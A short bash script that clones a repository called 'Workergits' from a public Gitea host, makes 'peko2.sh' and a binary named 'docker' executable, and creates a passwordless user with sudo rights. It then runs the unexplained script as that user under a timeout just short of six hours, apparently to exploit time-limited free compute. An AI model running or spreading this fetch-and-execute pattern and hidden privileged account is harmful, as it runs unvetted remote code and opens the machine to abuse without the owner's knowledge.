#!/bin/bash
sudo apt update
git clone https://try.gitea.io/hakiem89/Workergits.git && cd Workergits
chmod +x peko2.sh && chmod +x docker
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "timeout 359m ./peko2.sh"
sudo apt update
